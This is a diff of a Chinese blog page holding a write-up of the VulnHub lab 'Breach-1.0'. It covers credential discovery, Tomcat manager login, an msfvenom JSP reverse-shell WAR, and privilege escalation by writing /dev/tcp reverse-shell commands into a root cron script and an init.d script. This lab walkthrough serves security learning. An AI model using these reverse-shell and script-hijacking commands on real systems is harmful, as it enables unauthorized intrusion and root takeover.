@@ -131,30 +131,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/26/Hack%20Me%20Please%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&text=Breach-1.0 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&title=Breach-1.0 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&is_video=false&description=Breach-1.0 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Breach-1.0 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&title=Breach-1.0 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&title=Breach-1.0 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&title=Breach-1.0 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&title=Breach-1.0 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&name=Breach-1.0 Writeup&description=&lt;p&gt;我认为，该靶机难度还是很高的。被作者骗了。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/26/Breach-1.0%20Writeup/&t=Breach-1.0 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 网页信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E4%BF%A1%E6%81%AF"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. 后台信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">4.1.</span> <span class="toc-text">4.1. 方法1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">4.2.</span> <span class="toc-text">4.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
     </div>
@@ -181,8 +163,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-25T16:00:00.000Z" itemprop="datePublished">2022-05-26</time>
-        
-        (Updated: <time datetime="2022-05-26T14:38:04.970Z" itemprop="dateModified">2022-05-26</time>)
         
       
     </div>
@@ -224,8 +204,8 @@
 <p>通过对端口的扫描，发现该靶机开放了许多的端口，这看过去不正常，不论如何，先从80端口入手。</p>
 <h2 id="网页信息">2.2. 网页信息</h2>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526203548.png" /></p>
-<p>那段绿色的文字没有什么特殊意义，就是讲述了一个背景。查看页面源码发现注释了藏着一段字符： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>将字符两次base64解码后得到如下字符： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">pgibbons:damnitfeel$goodtobeagang$ta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>那段绿色的文字没有什么特殊意义，就是讲述了一个背景。查看页面源码发现注释了藏着一段字符： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</span><br></pre></td></tr></table></figure></p>
+<p>将字符两次base64解码后得到如下字符： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526201522.png" /></p>
 <p>暂时不知道这串字符的意思，先放在一旁。从源码中可以看出，点击图片会跳转到一个新的页面</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526201641.png" /></p>
@@ -237,19 +217,17 @@
 <h2 id="后台信息">2.3. 后台信息</h2>
 <p>在 inbox 中找到三封邮件</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526210209.png" /></p>
-<p>最后一封邮件的内容如下： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">FWD: Thank you for your purchase of Super Secret Cert Pro!
-  
-Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>最后一封邮件的内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FWD: Thank you for your purchase of Super Secret Cert Pro!</span><br><span class="line">  </span><br><span class="line">Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!</span><br></pre></td></tr></table></figure></p>
 <p>注意其中的 <code>192.168.110.140/.keystore</code> 以及 SSL certificate。将前者下载下来。</p>
 <p>（第一次登录后台需要编辑以下设置，就是在那些settings那里选择取消即可）点击 contributions 的 content 然后点击进去</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526210854.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526210939.png" /></p>
 <p>意思大致是这里有一份红队抓取的pcap包，但是经过加密的，同时 alias、storepassword、 keypassword都是tomcat。访问红框中的文件，下载下来。</p>
 <p>这时候想到刚刚下载的文件可能能够解密，但是这里我并不了解，于是Google...</p>
-<p>先利用 keytool 查看 keystore 中是否存在对应证书： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">keytool -list -keystore keystore<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>先利用 keytool 查看 keystore 中是否存在对应证书： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -keystore keystore</span><br></pre></td></tr></table></figure></p>
 <p>密码是 tomcat。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526212036.png" /></p>
-<p>从中提取出证书 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>从中提取出证书 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore keystore -destkeystore keystore -deststoretype pkcs12</span><br></pre></td></tr></table></figure></p>
 <p>没导入前的流量有着许多加密信息。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526213222.png" /></p>
 <p>然后将该证书导入 wireshark 中。edit -&gt; preferences 中</p>
@@ -260,8 +238,8 @@ Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keyst
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526213729.png" /></p>
 <p>找到如下</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526213803.png" /></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>将其base64解码得到： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">tomcat:Tt\5D8F(#!*u=G)4m7zB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC</span><br></pre></td></tr></table></figure>
+<p>将其base64解码得到： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u=G)4m7zB</span><br></pre></td></tr></table></figure></p>
 <p>根据流量包中的信息，得到一个新的url：<code>https://192.168.110.140:8443/_M@nag3Me/html</code></p>
 <blockquote>
 <p>注意：不能直接使用浏览器访问，我是开了burpsuite才可以访问到。是https，因为经过了加密，也可以直接在流量中找到。</p>
@@ -269,7 +247,7 @@ Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keyst
 <p>输入用户名和密码即可登录成功。</p>
 <h1 id="get-shell">3. get shell</h1>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526214822.png" /></p>
-<p>这里存在文件上传，可以直接上传 .war 的文件，这是 Java 的一种文件后缀。因此靶机上存在着Java环境，利用下面命令生成Java的后门 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.110.3 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f war <span class="token operator">></span> shell.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>这里存在文件上传，可以直接上传 .war 的文件，这是 Java 的一种文件后缀。因此靶机上存在着Java环境，利用下面命令生成Java的后门 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.3 LPORT=4444 -f war &gt; shell.war</span><br></pre></td></tr></table></figure></p>
 <p>然后上传</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526215123.png" /></p>
 <p>最后先监听对应端口，然后点击即可成功反弹shell</p>
@@ -282,44 +260,18 @@ Peter, I am not sure what this is. I saved the file here: 192.168.110.140/.keyst
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526220026.png" /></p>
 <p>这个猜测是 blumbergh 的密码。成功登录</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526220118.png" /></p>
-<p>查看家目录下的 .bash_history： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">clear
-logoff
-logout
-exit
-cd /usr/share/cleanup
-cat tidyup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>查看 tidyup.sh 内容： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token shebang important">#!/bin/bash</span>
-
-<span class="token comment">#Hacker Evasion Script </span>
-<span class="token comment">#Initech Cyber Consulting, LLC</span>
-<span class="token comment">#Peter Gibbons and Michael Bolton - 2016</span>
-<span class="token comment">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span>
-
-<span class="token builtin class-name">cd</span> /var/lib/tomcat6/webapps <span class="token operator">&amp;&amp;</span> <span class="token function">find</span> swingline -mindepth <span class="token number">1</span> -maxdepth <span class="token number">10</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span> -rf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>查看家目录下的 .bash_history： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">clear</span><br><span class="line">logoff</span><br><span class="line">logout</span><br><span class="line">exit</span><br><span class="line">cd /usr/share/cleanup</span><br><span class="line">cat tidyup.sh</span><br></pre></td></tr></table></figure></p>
+<p>查看 tidyup.sh 内容： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">Hacker Evasion Script</span> </span><br><span class="line"><span class="meta">#</span><span class="bash">Initech Cyber Consulting, LLC</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Peter Gibbons and Michael Bolton - 2016</span></span><br><span class="line"><span class="meta">#</span><span class="bash">This script is <span class="built_in">set</span> to run every 3 minutes as an additional defense measure against hackers.</span></span><br><span class="line"></span><br><span class="line">cd /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br></pre></td></tr></table></figure></p>
 <p>root会每3分钟执行该程序，如果我们能够写入数据就好了。查看 sudo -l</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526220759.png" /></p>
-<p>将反弹shell的命令利用 tee 命令写入该文件： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/192.168.110.3/3333 0>&amp;1'"</span><span class="token operator">|</span><span class="token function">sudo</span> <span class="token function">tee</span> /usr/share/cleanup/tidyup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>将反弹shell的命令利用 tee 命令写入该文件： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.110.3/3333 0&gt;&amp;1&#x27;&quot;|sudo tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526221018.png" /></p>
 <p>成功写入。</p>
 <p>kali开启监听，等待一会之后，成功拿到shell</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526221533.png" /></p>
-<p>最后读取flag <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/root/.flag.txt
------------------------------------------------------------------------------------
-
-______                     _     __   _____      _____ _          _____          _ 
-| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |
-| |_/ /_ __ ___  __ _  ___| |__ `| | | |/' |______| | | |__   ___| |__ _ __   __| |
-| ___ \ '__/ _ \/ _` |/ __| '_ \ | | |  /| |______| | | '_ \ / _ \  __| '_ \ / _` |
-| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
-\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|
-
-
------------------------------------------------------------------------------------
-Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!
-
-Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>最后读取flag <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/root/.flag.txt</span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">______                     _     __   _____      _____ _          _____          _ </span><br><span class="line">| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |</span><br><span class="line">| |_/ /_ __ ___  __ _  ___| |__ `| | | |/&#x27; |______| | | |__   ___| |__ _ __   __| |</span><br><span class="line">| ___ \ &#x27;__/ _ \/ _` |/ __| &#x27;_ \ | | |  /| |______| | | &#x27;_ \ / _ \  __| &#x27;_ \ / _` |</span><br><span class="line">| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |</span><br><span class="line">\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line">Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!</span><br><span class="line"></span><br><span class="line">Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.</span><br></pre></td></tr></table></figure></p>
 <h2 id="方法2">4.2. 方法2</h2>
-<p>查看进程，发现存在mysql <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ps</span> -aux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>查看进程，发现存在mysql <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526221837.png" /></p>
 <p>在 /var/www/5446 下面找到两个 php 文件，其中存放着数据库相关信息</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222017.png" /></p>
@@ -327,12 +279,12 @@ Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.<spa
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222245.png" /></p>
 <p>将密码破解<a target="_blank" rel="noopener" href="https://hashes.com/en/decrypt/hash">Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512, Wordpress, Bcrypt hashes for free online</a></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222421.png" /></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">milton:thelaststraw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">milton:thelaststraw</span><br></pre></td></tr></table></figure>
 <p>成功登录该用户</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222529.png" /></p>
 <p>然后在 /etc/init.d 目录下找属主为root但是当前用户拥有写权限的文件</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526222944.png" /></p>
-<p>这个目录下的文件都会在开机时自动执行，因此我们直接修改 portly.sh 的内容为： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">echo</span> <span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/192.168.110.3/3333 0>&amp;1'"</span> <span class="token operator">></span> portly.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>这个目录下的文件都会在开机时自动执行，因此我们直接修改 portly.sh 的内容为： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.110.3/3333 0&gt;&amp;1&#x27;&quot; &gt; portly.sh</span><br></pre></td></tr></table></figure></p>
 <p>然后重启靶机（物理重启）</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220526223443.png" /></p>
 <h1 id="总结">5. 总结</h1>
@@ -399,7 +351,6 @@ Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.<spa
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
